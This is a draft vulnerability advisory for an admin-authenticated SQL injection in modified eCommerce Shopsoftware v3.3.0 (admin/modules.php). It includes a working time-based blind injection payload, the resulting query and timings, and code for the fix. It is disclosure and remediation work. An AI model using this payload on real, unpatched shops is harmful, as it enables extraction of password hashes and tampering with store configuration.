# modified eCommerce Shopsoftware - SQL Injection in `admin/modules.php`

| Field                 | Value                                                                                                                                                                                 |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Advisory ID**       | VEX-2026-004                                                                                                                                                                          |
| **Title**             | SQL Injection in `admin/modules.php`                                                                                                                                                  |
| **Affected Product**  | modified eCommerce Shopsoftware                                                                                                                                                       |
| **Affected Versions** | <= v3.3.0 (latest official release, tagged 2026-01-29)                                                                                                                                |
| **Fixed Versions**    | Fixed upstream on the `main` branch (commit `0337f941e`, 2026-10-07, PR #3438), but not yet included in any tagged release — v3.3.0 remains the latest release and remains vulnerable |
| **CWE**               | CWE-89: Improper Neutralization of Special Elements used in an SQL Command                                                                                                            |
| **CVSS v3.1 Score**   | 6.5 (Medium)                                                                                                                                                                          |
| **CVSS v3.1 Vector**  | AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N                                                                                                                                                   |
| **CVE ID**            | not assigned                                                                                                                                                                          |
| **Reporter**          | [miguelmoraesx](https://github.com/miguelmoraesx), [V1r4l3xpl017](https://github.com/V1r4l3xpl017), Carlos Tuma, Smith Braz                                                           |
| **Vendor**            | modified-shop.org                                                                                                                                                                     |
| **Status**            | Draft — pending vendor report                                                                                                                                                         |
| **Disclosure Date**   | TBD                                                                                                                                                                                   |

---

## Summary

> The module configuration save handler in `admin/modules.php` escapes the posted configuration value (`$value`) before writing it to the database, but not the array key (`$key`). An authenticated admin with access to the modules management page can submit a crafted `configuration[<key>]` array key that breaks out of the `UPDATE ... WHERE configuration_key = '...'` clause, allowing arbitrary SQL conditions to be injected. This was confirmed with a time-based blind injection using `SLEEP()`. The vulnerability is present in v3.3.0, the latest released version; a fix exists upstream but has not shipped in any release yet.

---

## Affected Component

- **File(s):** `admin/modules.php`
- **Function(s) / Endpoint(s):** POST `?set=categories&module=<module>&action=save`
- **Parameter(s):** `configuration[<key>]`

---

## Vulnerability Details

### Root Cause

Inside the `save` action handler, the configuration value is escaped with `xtc_db_input()`, but the array key is concatenated into the `UPDATE` statement's `WHERE` clause without any escaping:

```php
# admin/modules.php (v3.3.0)
xtc_db_query("update " . TABLE_CONFIGURATION . " set configuration_value = '" . xtc_db_input($value) . "' where configuration_key = '" . $key . "'");
```

Since `$key` comes directly from the `configuration[<key>]` POST array and is never validated against the list of legitimate keys returned by the module's own `keys()` method, an attacker-controlled key reaches the query verbatim. Closing the quote inside the key breaks out of the `WHERE` clause and lets arbitrary SQL conditions be appended.

### Preconditions

- Authenticated admin session with access to the modules management page.
- Ability to submit arbitrary POST parameters to `action=save`.
- A valid CSRF token, if `CSRF_TOKEN_SYSTEM` is enabled on the target instance.

---

## Proof of Concept

### Environment

- Target: v3.3.0, running localhost via Docker containers
- Authenticated as: admin, with access to `admin/modules.php`

The test was carried out in the browser, preserving the admin form and its CSRF token, against the module `catCopyProductName`.

### Payload

```text
configuration[RS_NO_MATCH' OR IF(configuration_key='ACCOUNT_COMPANY',SLEEP(5),0) OR 'x'='y]=unused
```

### Resulting query (captured from the MariaDB general log)

```sql
UPDATE configuration
SET configuration_value = 'unused'
WHERE configuration_key = 'RS_NO_MATCH'
   OR IF(configuration_key='ACCOUNT_COMPANY',SLEEP(5),0)
   OR 'x'='y'
```

This confirms the posted key reached the query unescaped and altered the `WHERE` clause.

### Timing results

| Payload | HTTP Status | Total time |
|---|---|---|
| `SLEEP(5)` | 200 | 6.50s |
| `SLEEP(15)` | 200 | 16.65s |

The observed delay matches the injected `SLEEP()` duration in both tests.

### Post-test integrity check

```sql
SELECT configuration_key, configuration_value FROM configuration WHERE configuration_key = 'RS_NO_MATCH';
```

Result: empty set. The injected key did not create a stray `configuration` row (the `OR` branches never evaluate `configuration_key = 'RS_NO_MATCH'` as a write target, only as part of the `WHERE` condition).

### Note on local re-testing

This repository's `main` branch already contains the fix (`0337f941e`) on top of v3.3.0, so a Docker instance built from the current checkout of `main` will **not** reproduce this PoC — the key is already escaped there. To re-verify, build the instance from the `v3.3.0` tag specifically.

---

## Impact

- An authenticated admin with access to any module configuration page can inject arbitrary SQL conditions into the `UPDATE` statement's `WHERE` clause.
- Demonstrated: blind data inference via time-based side channels (`SLEEP()`), which can be scripted to extract arbitrary data from the database (e.g. password hashes from other admin or customer accounts), independent of the attacking admin's own permissions elsewhere in the panel.
- Depending on the injected expression, this could also be used to affect which `configuration` rows are updated beyond the intended module.

---

## Suggested Remediation

Escape the key the same way the value already is:

```php
// Before
xtc_db_query("update " . TABLE_CONFIGURATION . " set configuration_value = '" . xtc_db_input($value) . "' where configuration_key = '" . $key . "'");

// After
xtc_db_query("update " . TABLE_CONFIGURATION . " set configuration_value = '" . xtc_db_input($value) . "' where configuration_key = '" . xtc_db_input($key) . "'");
```

This matches the fix already applied upstream in commit `0337f941e` (PR #3438), which was ported to both `admin/modules.php` and `admin/module_export.php`.

### Additional recommendation

As defense-in-depth, validate `$key` against an allowlist derived from `$module->keys()` before the `UPDATE`, consistent with the remediation recommended for the sibling finding in `admin/accounting.php` (VEX-2026-003):

```php
$allowed_keys = method_exists($module, 'keys') ? (array)$module->keys() : array();

foreach ($configuration as $key => $value) {
  if (!in_array($key, $allowed_keys, true)) {
    continue;
  }
  ...
  xtc_db_query("update " . TABLE_CONFIGURATION . " set configuration_value = '" . xtc_db_input($value) . "' where configuration_key = '" . xtc_db_input($key) . "'");
}
```

---

## Timeline

| Date       | Event                                                                 |
| ---------- | ---------------------------------------------------------------------- |
| 2026-11-11 | Vulnerability discovered and validated locally (static review + PoC) |
| 2026-11-12 | Reported to vendor                                                     |
| TBD        | Vendor acknowledged                                                    |
| TBD        | Fix released in a tagged version                                       |
| TBD        | Public disclosure                                                      |

---

## Credits

- [miguelmoraesx](https://github.com/miguelmoraesx)
- [V1r4l3xpl017](https://github.com/V1r4l3xpl017)
- Carlos Tuma
- Smith Braz
